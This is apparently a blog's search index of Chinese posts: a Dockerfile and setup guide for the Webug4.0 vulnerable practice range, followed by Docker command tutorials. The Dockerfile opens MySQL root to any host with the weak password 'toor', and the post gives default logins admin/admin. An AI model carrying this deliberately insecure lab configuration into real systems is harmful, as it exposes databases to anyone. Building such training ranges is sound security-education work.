<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>首发，Webug4.0的Docker版本来了！</title>
      <link href="/2019/08/05/Webug-docker/"/>
      <url>/2019/08/05/Webug-docker/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>WeBug名称定义为”我们的漏洞”靶场环境 ，基础环境是基于PHP/mysql制作搭建而成，中级环境与高级环境分别都是由互联网漏洞事件而收集的漏洞存在的操作环境。在webug3.0发布后的四百多天226安全团队终于在大年初二发布了webug的4.0版本。<br>Webug4.0官网地址：<code>https://www.webug.org</code><br>Webug4.0官方源码：<code>https://github.com/wangai3176/webug4.0</code><br>Webug4.0安装介绍：<code>https://www.freebuf.com/column/195521.html</code><br>基于项目的源码搭建了一个Docker版本的Webug4.0，已经push到了Docker hub，欢迎大家下载来玩~<br>听很多小伙伴说有时候自己搭建的时候，由于php版本问题导致有些注入题做不了，这点我做Docker镜像的时候想到了，然后搭建完本地测试了一下，注入题没问题。希望小伙伴们在玩的过程中遇到问题及时联系我反馈啊~<br><a href="http://www.226safe.com/" target="_blank" rel="noopener"><strong>向226安全团队的前辈们致敬~</strong></a></p><h1 id="构建过程"><a href="#构建过程" class="headerlink" title="构建过程"></a>构建过程</h1><p>首先是下载了Webug4.0版本的源码，然后编写Dockerfile<br>Dockerfile内容如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">FROM ubuntu:trusty</span><br><span class="line">MAINTAINER Area39@163.com</span><br><span class="line">RUN echo &quot;deb http://mirrors.aliyun.com/ubuntu/ trusty main restricted universe multiverse&quot;&gt; /etc/apt/sources.list</span><br><span class="line">RUN apt-get update \</span><br><span class="line">        &amp;&amp; apt-get install -y mysql-server apache2 php5 php5-mysql</span><br><span class="line">COPY sql /root/</span><br><span class="line">RUN /etc/init.d/mysql start &amp;&amp;\</span><br><span class="line">    mysql -e &quot;grant all privileges on *.* to &apos;root&apos;@&apos;%&apos; identified by &apos;toor&apos;;&quot;&amp;&amp;\</span><br><span class="line">    mysql -e &quot;grant all privileges on *.* to &apos;root&apos;@&apos;localhost&apos; identified by &apos;toor&apos;;&quot;&amp;&amp;\</span><br><span class="line">    mysql -u root -ptoor -e &quot;show databases;&quot; &amp;&amp;\</span><br><span class="line">    mysql -u root -ptoor --default-character-set=utf8 &lt;/root/webug.sql &amp;&amp;\</span><br><span class="line">    mysql -u root -ptoor -e &quot;show databases;&quot; &amp;&amp;\</span><br><span class="line">    mysql -u root -ptoor &lt;/root/webug_sys.sql &amp;&amp;\</span><br><span class="line">    mysql -u root -ptoor -e &quot;show databases;&quot; &amp;&amp;\</span><br><span class="line">    mysql -u root -ptoor &lt;/root/webug_width_byte.sql &amp;&amp;\</span><br><span class="line">    mysql -u root -ptoor -e &quot;show databases;&quot;</span><br><span class="line">RUN sed -Ei &apos;s/^(bind-address|log)/#&amp;/&apos; /etc/mysql/my.cnf \</span><br><span class="line">&amp;&amp; echo &apos;skip-host-cache\nskip-name-resolve&apos; | awk &apos;&#123; print &#125; $1 == &quot;[mysqld]&quot; &amp;&amp; c == 0 &#123; c = 1; system(&quot;cat&quot;) &#125;&apos; /etc/mysql/my.cnf &gt; /tmp/my.cnf \</span><br><span class="line">&amp;&amp; mv /tmp/my.cnf /etc/mysql/my.cnf</span><br><span class="line">COPY webug /var/www/html</span><br><span class="line">RUN rm /var/www/html/index.html &amp;&amp;\</span><br><span class="line"> chown www-data:www-data /var/www/html -R &amp;&amp;\</span><br><span class="line"> rm -rf /root/*</span><br><span class="line">COPY httpd-foreground /usr/bin</span><br><span class="line">EXPOSE 80</span><br><span class="line">CMD [&quot;httpd-foreground&quot;]</span><br></pre></td></tr></table></figure><p>在这里踩了个坑，Dockerfile第11行<code>mysql -u root -ptoor &lt;/root/webug.sql</code>，由于导入数据库文件时没指定字符集，所以直接乱码了。解决方法：<code>mysql -u root -ptoor --default-character-set=utf8 &lt;/root/webug.sql</code>指定为utf8就可以了。</p><h1 id="搭建方式"><a href="#搭建方式" class="headerlink" title="搭建方式"></a>搭建方式</h1><ul><li>通过Dockerfile</li><li>通过Docker hub</li></ul><h2 id="通过Dockerfile搭建"><a href="#通过Dockerfile搭建" class="headerlink" title="通过Dockerfile搭建"></a>通过Dockerfile搭建</h2><p>项目已经传到了Github，<a href="https://github.com/Area39/Webug4.0-Docker" target="_blank" rel="noopener">传送门</a><br>目录结构<br><img src="https://tva4.sinaimg.cn/large/007DFXDhgy1g5nckxhmv5j30uk04uq38.jpg" alt><br>然后在本目录下输入<code>docker build -t webug:4.0 .</code><br><img src="https://tva4.sinaimg.cn/large/007DFXDhgy1g5ncmy9y7fj316d0er401.jpg" alt><br>稍等片刻，你的Webug就搭建完成了。<br>启动Webug:4.0容器<br><code>docker run -d -P webug:4.0</code><br><img src="https://tva3.sinaimg.cn/large/007DFXDhly1g5ncr0avthj314s06274n.jpg" alt><br>然后访问ip+映射的端口，可以看到后台登录界面<br><img src="https://tva3.sinaimg.cn/large/007DFXDhgy1g5ncp6v58fj31650kqgmd.jpg" alt><br>默认账号：</p><ul><li>后台管理员：admin/admin</li><li>数据库密码：root/toor</li></ul><p><img src="https://tva3.sinaimg.cn/large/007DFXDhgy1g5nctcdvatj31hc0sc77j.jpg" alt></p><h2 id="通过Docker-hub搭建"><a href="#通过Docker-hub搭建" class="headerlink" title="通过Docker hub搭建"></a>通过Docker hub搭建</h2><p>为了大家方便使用，已经push到了docker hub上面。<br>从Docker hub上拉取镜像<br><code>docker pull area39/webug</code><br><img src="https://tva2.sinaimg.cn/large/007DFXDhgy1g5nd0z95hyj30yf0bzdgu.jpg" alt><br>启动过程<br><code>docker run -d -P area39/webug</code><br><img src="https://tva3.sinaimg.cn/large/007DFXDhly1g5oprxekjnj314w052dg7.jpg" alt><br>此时你的Webug就能使用啦。<br><img src="https://tva4.sinaimg.cn/large/007DFXDhgy1g5nd8tcujij31460ne0ti.jpg" alt></p>]]></content>
      
      
      <categories>
          
          <category> 靶机搭建 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
            <tag> 靶机搭建 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker可视化管理工具</title>
      <link href="/2019/07/24/Docker-portainer/"/>
      <url>/2019/07/24/Docker-portainer/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><strong>前面把Docker的一些基础操作命令过了一遍，这次讲一下可视化Docker管理工具</strong><br>如何安装Docker?请参考上一篇文章(<a href="https://linuz.me/2019/07/19/Docker-install">传送门</a>)<br>Docker环境信息、容器生命周期管理部分命令参考上一篇文章(<a href="https://linuz.me/2019/07/20/Docker-1">传送门</a>)<br>镜像仓库相关命令、镜像管理相关命令参考上一篇文章(<a href="https://linuz.me/2019/07/21/Docker-2">传送门</a>)<br>容器运维操作、系统日志相关命令参考上一篇文章(<a href="https://linuz.me/2019/07/23/Docker-3">传送门</a>)</p><h1 id="Docker可视化管理工具"><a href="#Docker可视化管理工具" class="headerlink" title="Docker可视化管理工具"></a>Docker可视化管理工具</h1><p>Docker常见的几款web工具：</p><ul><li>docker UI</li><li>shipyard</li><li>portainer</li></ul><p><strong>本次是在Centos7上安装portainer</strong><br>首先搜索一下Docker Hub上的portainer镜像</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# docker search portainer</span><br></pre></td></tr></table></figure><p><img src="https://tva2.sinaimg.cn/large/007DFXDhgy1g5apaa4odfj317s0i3mz3.jpg" alt><br>然后下载官方portainer镜像</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# docker pull portainer/portainer</span><br></pre></td></tr></table></figure><p><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g5apbdqnw2j30ue04qq36.jpg" alt><br>在后台运行portainer容器，端口映射成9000，–restart=always表示开机自启动</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p 9000:9000 --restart=always --name portainer -v /var/run/docker.sock:/var/run/docker.sock -v /Users/lee/dev/docker_file/portainer/data:/data docker.io/portainer/portainer</span><br></pre></td></tr></table></figure><p><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g5apbwfaknj317z02qdfy.jpg" alt><br><img src="https://tva3.sinaimg.cn/large/007DFXDhgy1g5apeg4xyxj317t03ft8r.jpg" alt><br>启动成功，浏览器访问ip:9000，初次访问需要设置密码，8位以上<br><img src="https://tva4.sinaimg.cn/large/007DFXDhgy1g5apeqzav0j31hc0scgnh.jpg" alt><br>然后选择Local(本地模式)<br><img src="https://tva2.sinaimg.cn/large/007DFXDhgy1g5apjkuqpzj31hc0scn0g.jpg" alt><br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g5apkghmtbj31hc0scgog.jpg" alt><br><img src="https://tva4.sinaimg.cn/large/007DFXDhgy1g5apl30k8uj31hc0sc0vv.jpg" alt><br>功能区<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g5appmkxx0j31hc0scdjr.jpg" alt><br>我们可以在images功能处直接pull一个新镜像(必须是Docker Hub上有的)<br><img src="https://tva2.sinaimg.cn/large/007DFXDhgy1g5apst92gcj31hc0sctd4.jpg" alt><br><img src="https://tva2.sinaimg.cn/large/007DFXDhgy1g5apt4r0qqj31hc0sc79j.jpg" alt><br>添加容器<br><img src="https://tva4.sinaimg.cn/large/007DFXDhgy1g5aptws77mj31hc0scadi.jpg" alt><br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g5apud185pj31hc0sc442.jpg" alt><br>可以将容器内的端口全部随机映射到本机，也可以手动添加需要映射的端口，本次是将容器的80端口映射到本机的8080端口<br><img src="https://tva2.sinaimg.cn/large/007DFXDhgy1g5apwr4faxj313x0aegmo.jpg" alt><br>启动成功<br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g5apxivmzgj31hc0scwj8.jpg" alt><br><img src="https://tva3.sinaimg.cn/large/007DFXDhgy1g5apzvg8pdj31hc0sc7bj.jpg" alt><br><a href="https://www.cnblogs.com/lixyu/p/docker-portaine.html" target="_blank" rel="noopener">部分参考</a></p>]]></content>
      
      
      <categories>
          
          <category> 虚拟化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker学习笔记(3)</title>
      <link href="/2019/07/23/Docker-3/"/>
      <url>/2019/07/23/Docker-3/</url>
      
        <content type="html"><![CDATA[<p>如何安装Docker?请参考上一篇文章(<a href="https://linuz.me/2019/07/19/Docker-install">传送门</a>)<br>Docker环境信息、容器生命周期管理部分命令参考上一篇文章(<a href="https://linuz.me/2019/07/20/Docker-1">传送门</a>)<br>镜像仓库相关命令、镜像管理相关命令参考上一篇文章(<a href="https://linuz.me/2019/07/21/Docker-2">传送门</a>)<br><strong>如果没什么意外，这应该是基础命令的最后一篇了…</strong><br>总结到了一张脑图上，可以做个参考，<a href="https://edrawcloudpubliccn.oss-cn-shenzhen.aliyuncs.com/viewer/self/985122/share/2019-7-20/1563615986/main.svg" target="_blank" rel="noopener">查看高清版请点我</a><br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g56g4mmkc1j30wv0u01kx.jpg" alt></p><h1 id="容器运维操作"><a href="#容器运维操作" class="headerlink" title="容器运维操作"></a>容器运维操作</h1><p>1.docker attach<br>连接正在运行的容器，观察该容器的运行情况，或与容器的主进程进行交互</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker attach [OPTIONS] CONTAINER</span><br><span class="line"></span><br><span class="line">--sig-proxy=false：确保CTRL-D或CTRL-C不会关闭容器</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# docker attach fcc9bdf1587f</span><br><span class="line">root@fcc9bdf1587f:/#</span><br></pre></td></tr></table></figure><p><img src="https://tva4.sinaimg.cn/large/007DFXDhgy1g58qdridjtj30qy01ft8l.jpg" alt="attach"><br>2.docker inspect<br>查看镜像和容器的详细信息，默认会列出全部信息，可以通过–format参数来指定输出的模板格式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker inspect [OPTIONS] NAME|ID [NAME|ID...]</span><br><span class="line"></span><br><span class="line">-f :指定返回值的模板文件</span><br><span class="line">-s :显示总的文件大小</span><br><span class="line">--type :为指定类型返回JSON</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# docker inspect ubuntu:latest</span><br></pre></td></tr></table></figure><p><img src="https://tva2.sinaimg.cn/large/007DFXDhgy1g58qk39rytj30wb06s74i.jpg" alt="inspect"><br>3.docker ps<br>常用的选项有-a和-l，-a选项可以查看所有的容器，包括停止的容器；-l选项只查看最新创建的容器，包括不在运行的容器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">docker ps [OPTIONS]</span><br><span class="line"></span><br><span class="line">-a :显示所有的容器，包括未运行的</span><br><span class="line">-f :根据条件过滤显示的内容</span><br><span class="line">--format :指定返回值的模板文件</span><br><span class="line">-l :显示最近创建的容器</span><br><span class="line">-n :列出最近创建的n个容器</span><br><span class="line">--no-trunc :不截断输出</span><br><span class="line">-q :静默模式，只显示容器编号</span><br><span class="line">-s :显示总的文件大小</span><br></pre></td></tr></table></figure><p>示例 列出所有创建的容器CONTAINER ID：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# docker ps -a -q</span><br></pre></td></tr></table></figure><p><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g58qqgutf8j30k302qdfr.jpg" alt><br>4.docker rename<br>重命名容器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rename CONTAINER NEW_NAME</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# docker rename 48432e783e65 ctf-xss</span><br></pre></td></tr></table></figure><p><img src="https://tva4.sinaimg.cn/large/007DFXDhgy1g59hsnthaej317z0680t9.jpg" alt="rename"><br>5.docker stats<br>显示容器资源使用情况统计信息的实时流</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker stats [OPTIONS] [CONTAINER...]</span><br><span class="line"></span><br><span class="line">--all , -a显示所有容器（默认显示刚刚运行）</span><br><span class="line">--format使用模板输出</span><br><span class="line">--no-trunc不要截断输出</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# docker stats ctf-xss</span><br></pre></td></tr></table></figure><p><img src="https://tva2.sinaimg.cn/large/007DFXDhgy1g59hxtgqr1j317x06iwei.jpg" alt="stats"><br>6.docker top<br>查看容器中运行的进程信息，支持 ps 命令参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker top [OPTIONS] CONTAINER [ps OPTIONS]</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# docker top ctf-xss</span><br></pre></td></tr></table></figure><p><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g59i0v88dej317b0cpwf8.jpg" alt="top"><br>7.docker cp<br>用于容器与主机之间的数据拷贝</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker cp [OPTIONS] CONTAINER:SRC_PATH DEST_PATH|-</span><br><span class="line">docker cp [OPTIONS] SRC_PATH|- CONTAINER:DEST_PATH</span><br><span class="line"></span><br><span class="line">-L :保持源目标中的链接</span><br></pre></td></tr></table></figure><p>示例1 将本目录下的test.php文件复制到容器的’/var/www/html/‘目录下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# docker cp test.php 5198ec963e43:/var/www/html/</span><br><span class="line">[root@localhost ~]# docker exec -it 5198ec963e43 /bin/bash</span><br><span class="line">root@5198ec963e43:/# ls /var/www/html</span><br><span class="line">index.phptest.php</span><br></pre></td></tr></table></figure><p><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g59j25vbg5j30s704taac.jpg" alt><br>示例2 将容器内’/var/www/html/index.php’复制到本机/root目录下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# docker cp 5198ec963e43:/var/www/html/index.php /root/</span><br><span class="line">[root@localhost ~]# ls</span><br><span class="line">index.phptest.php</span><br></pre></td></tr></table></figure><p><img src="https://tva4.sinaimg.cn/large/007DFXDhgy1g59j7gq3frj30r2024jrc.jpg" alt><br>8.docker diff<br>检查容器里文件结构的更改</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker diff [OPTIONS] CONTAINER</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# docker diff 5198ec963e43</span><br></pre></td></tr></table></figure><p><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g59jiqetrej30qf09emxk.jpg" alt="diff"></p><h1 id="系统日志相关命令"><a href="#系统日志相关命令" class="headerlink" title="系统日志相关命令"></a>系统日志相关命令</h1><p>1.docker events<br>从服务器获取实时事件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker events [OPTIONS]</span><br><span class="line"></span><br><span class="line">-f:根据条件过滤事件</span><br><span class="line">--since:从指定的时间戳后显示所有事件</span><br><span class="line">--until:流水时间显示到指定的时间为止</span><br></pre></td></tr></table></figure><p>示例 显示docker 2019年7月22日后的所有事件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# docker events --since=&quot;2019-07-22&quot;</span><br></pre></td></tr></table></figure><p><img src="https://tva2.sinaimg.cn/large/007DFXDhgy1g59jsc12vrj317x084t9v.jpg" alt="events"><br>2.docker history<br>查看指定镜像的创建历史</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker history [OPTIONS] IMAGE</span><br><span class="line"></span><br><span class="line">-H :以可读的格式打印镜像大小和日期，默认为true</span><br><span class="line">--no-trunc :显示完整的提交记录</span><br><span class="line">-q :仅列出提交记录ID</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# docker history ctf-sqli:1</span><br></pre></td></tr></table></figure><p><img src="https://tva4.sinaimg.cn/large/007DFXDhgy1g59jwj93a7j314109fmyg.jpg" alt="history"><br>3.docker logs<br>获取容器的日志</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">docker logs [OPTIONS] CONTAINER</span><br><span class="line"></span><br><span class="line">-f : 跟踪日志输出</span><br><span class="line">--since :显示某个开始时间的所有日志</span><br><span class="line">-t : 显示时间戳</span><br><span class="line">--tail :仅列出最新N条容器日志</span><br></pre></td></tr></table></figure><p>示例 查看容器nginx的日志输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# docker logs -f 49c0e49db6f7</span><br></pre></td></tr></table></figure><p><img src="https://tva2.sinaimg.cn/large/007DFXDhgy1g59kaotcl1j317u08wmys.jpg" alt="logs"><br><strong>部分命令参考来自菜鸟教程(<a href="https://www.runoob.com/docker/docker-command-manual.html" target="_blank" rel="noopener">传送门</a>)</strong></p>]]></content>
      
      
      <categories>
          
          <category> 虚拟化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker学习笔记(2)</title>
      <link href="/2019/07/21/Docker-2/"/>
      <url>/2019/07/21/Docker-2/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>如何安装Docker?请参考上一篇文章(<a href="https://linuz.me/2019/07/19/Docker-install">传送门</a>)<br>Docker环境信息、容器生命周期管理部分命令参考上一篇文章(<a href="https://linuz.me/2019/07/20/Docker-1">传送门</a>)<br>总结到了一张脑图上，可以做个参考，<a href="https://edrawcloudpubliccn.oss-cn-shenzhen.aliyuncs.com/viewer/self/985122/share/2019-7-20/1563615986/main.svg" target="_blank" rel="noopener">查看高清版请点我</a><br><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g56g4mmkc1j30wv0u01kx.jpg" alt></p><h1 id="镜像仓库相关命令"><a href="#镜像仓库相关命令" class="headerlink" title="镜像仓库相关命令"></a>镜像仓库相关命令</h1><p>1.docker login<br>登陆到一个Docker镜像仓库，如果未指定镜像仓库地址，默认为官方仓库 Docker Hub</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker login [OPTIONS] [SERVER]</span><br><span class="line"></span><br><span class="line">-u :登陆的用户名</span><br><span class="line">-p :登陆的密码</span><br></pre></td></tr></table></figure><p>示例： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker login -u username -p password</span><br></pre></td></tr></table></figure><p><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g574sjemaaj30sm020q2x.jpg" alt><br>你也可以这样直接docker login,然后会让你输入用户名和密码，验证成功就登录了。<br><img src="https://tva4.sinaimg.cn/large/007DFXDhgy1g574z0fjedj317u046wel.jpg" alt><br>2.docker logout<br>登出一个Docker镜像仓库，如果未指定镜像仓库地址，默认为官方仓库 Docker Hub<br>示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker logout</span><br></pre></td></tr></table></figure><p><img src="https://tva2.sinaimg.cn/large/007DFXDhgy1g574vmes4nj30qi01h0sm.jpg" alt="logout"><br>3.docker search<br>从Docker Hub上查找指定的镜像</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker search [OPTIONS] images</span><br><span class="line"></span><br><span class="line">--automated :只列出 automated build类型的镜像</span><br><span class="line">--no-trunc :显示完整的镜像描述</span><br><span class="line">-s :列出收藏数不小于指定值的镜像</span><br></pre></td></tr></table></figure><p>示例 从Docker Hub查找所有镜像名包含nginx的，并且收藏数大于10的镜像：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker search -s 10 nginx</span><br></pre></td></tr></table></figure><p><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g5759f0uy3j316l0bg401.jpg" alt="search"><br>4.docker pull<br>从镜像仓库中拉取或者更新指定镜像</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker pull [OPTIONS] NAME[:TAG|@DIGEST]</span><br><span class="line"></span><br><span class="line">-a：拉取所有 tagged 镜像</span><br><span class="line">--disable-content-trust :忽略镜像的校验，默认开启</span><br></pre></td></tr></table></figure><p>示例 从Docker Hub拉取nginx最新版镜像：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull nginx</span><br></pre></td></tr></table></figure><p><img src="https://tva1.sinaimg.cn/large/007DFXDhgy1g575gf49yfj30u805iaad.jpg" alt="pull"><br>5.docker push<br>将本地的镜像上传到镜像仓库，首先要登录到镜像仓库，还要登录到Docker Hub创建对应名称的仓库，然后用tag命令给镜像打标签，只有打上标签才可以上传成功。(<a href="https://blog.csdn.net/sk_grace/article/details/81220675" target="_blank" rel="noopener">详细介绍</a>)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker push [OPTIONS] NAME[:TAG]</span><br><span class="line"></span><br><span class="line">--disable-content-trust :忽略镜像的校验,默认开启</span><br></pre></td></tr></table></figure><p>6.docker tag<br>标记本地镜像，将其归入某一仓库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker tag [OPTIONS] IMAGE[:TAG] [REGISTRYHOST/][USERNAME/]NAME[:TAG]</span><br></pre></td></tr></table></figure><p>一个完整的push示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# docker tag nginx:latest area39/nginx:v1</span><br><span class="line">[root@localhost ~]# docker push area39/nginx:v1</span><br><span class="line">The push refers to repository [docker.io/area39/nginx]</span><br><span class="line">589561a3ffb4: Pushed</span><br><span class="line">ef7dbb0cfc81: Pushed</span><br><span class="line">d56055da3352: Pushed</span><br><span class="line">v1: digest: sha256:f83b2ffd963ac911f9e638184c8d580cc1f3139d5c8c33c87c3fb90aebdebf76 size: 948</span><br></pre></td></tr></table></figure><p><img src="https://tva3.sinaimg.cn/large/007DFXDhgy1g576o798rcj30tl0f53z9.jpg" alt><br><img src="https://tva4.sinaimg.cn/large/007DFXDhgy1g576ppt6ibj30tl04ugly.jpg" alt><br><img src="https://tva3.sinaimg.cn/large/007DFXDhgy1g576rxp6hsj31b00i9gmz.jpg" alt><br><img src="https://tva4.sinaimg.cn/large/007DFXDhgy1g57701qqfwj30tn06saal.jpg" alt></p><h1 id="镜像管理相关命令"><a href="#镜像管理相关命令" class="headerlink" title="镜像管理相关命令"></a>镜像管理相关命令</h1><p>1.docker build<br>用于使用Dockerfile文件创建镜像，是一个比较常用和重要的命令，关于Dockerfile文件如何定制化，后续会写一篇文专门讲。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">docker build [OPTIONS] PATH | URL | -</span><br><span class="line"></span><br><span class="line">--build-arg=[] :设置镜像创建时的变量；</span><br><span class="line">-f :指定要使用的Dockerfile路径；</span><br><span class="line">--force-rm :设置镜像过程中删除中间容器；</span><br><span class="line">--isolation :使用容器隔离技术；</span><br><span class="line">-m :设置内存最大值；</span><br><span class="line">--memory-swap :设置Swap的最大值为内存+swap，&quot;-1&quot;表示不限swap；</span><br><span class="line">--pull :尝试去更新镜像的新版本；</span><br><span class="line">--quiet, -q :安静模式，成功后只输出镜像 ID；</span><br><span class="line">--rm :设置镜像成功后删除中间容器；</span><br><span class="line">--shm-size 